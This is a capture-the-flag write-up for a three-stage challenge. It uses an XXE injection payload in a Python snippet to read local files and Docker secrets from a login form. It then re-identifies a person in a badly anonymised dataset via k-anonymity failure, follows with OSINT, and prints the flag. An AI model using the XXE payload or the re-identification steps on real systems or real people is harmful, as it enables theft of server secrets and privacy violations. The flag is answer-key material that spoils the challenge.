# Private Area

**Author:** thiefCatcher and Rackham
**Category:** misc
**Difficulty:** hard

## Description

In the Cloud Infrastructure course, students just found the advantages of using recent platforms for their container orchestration.
They understood the concepts, and were highly enthusiastic about isolation and secret management features.

## Solve

This challenge is divided into three stages. The first part starts with a web page vulnerable by XXE injection.

![Captura de ecra](https://user-images.githubusercontent.com/17878072/146542767-5548f2a7-a096-4bb2-922e-3a466c583dd1.png)

To get the files from the machine, you can use the following snippet of code:

```python
headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
safe_string = urllib.parse.quote_plus(f'<?xml version="1.0" ?><!DOCTYPE r [<!ENTITY sp SYSTEM "file://{filename}">]><form><username>&sp;</username><password>p</password></form>')
r = s.post(f"{url}/login/", data='xml='+safe_string, headers=headers)
```

The goal of this first phase is to access the docker secrets. So we can create a token as admin and access the '/private' link. This page contains the following information:

```html
<head>
    <link rel="stylesheet" href="/static/css/style.css"></link>
</head>

<body>
<div class="wrapper fadeInDown">
  <div id="formContent">
    <h2 class="active"> Private Data </h2>
    <div>
      <h3>static/1BKTYGPU8V4HBX6ZANJO8PIUD3NUSA/dump.zip</h3>
    </div>
  </div>
</div>
</body>
```

The second stage requires downloading the dump.zip file at `http://193.137.173.211:2006/static/1BKTYGPU8V4HBX6ZANJO8PIUD3NUSA/dump.zip`
Inside this zip file, there are 3 files:

  - contacts.csv: which contains an id, name, surname and the social network of the subjects
  - leak.csv: which is supposed to be anonymized, but it was incorrectly anonymized. 
  - README.md: a readme file with some hints about what should be done.

```
# About

We did a mistake during the anonymization process of this data. The person responsible for anonymizing the dataset did not respect Mister K5. If you find the right person, you will find his/her social network. The flag is there.
```

One of the most used anonymization techniques is k-anonymity. One of its principles indicates that an anonymised dataset should have at least k records with the same quasi-identifiers. We can obtain that information by using the following command:

```
cat leak.csv |cut -d ',' -f 2,3,4 |sort |uniq -c |sort -n -r
```

The result of this operation is a female person with 25 years living in the zip-code area 3810-391 (25,female,3810-391). This quasi identifier only occurs 4 times, which does not respect the k-anonymization rule. By retrieving the 4 entries, we can see that there is one with a social_network_id, that we can correlate with the contacts.csv file. This way we obtain the Alina Petrov on Facebook.

```
$ cat leak.csv| grep 25,female,3810-391
NaN,25,female,3810-391,NaN
NaN,25,female,3810-391,NaN
NaN,25,female,3810-391,4KH3QS1HH0
NaN,25,female,3810-391,NaN
```

The third phase is based on OSINT and the goal is to find the flag on Alina's profile. This flag is in a video of DETI (the organizers' department)

## Flag

CTFUA{i_l0ve_Av3iro}
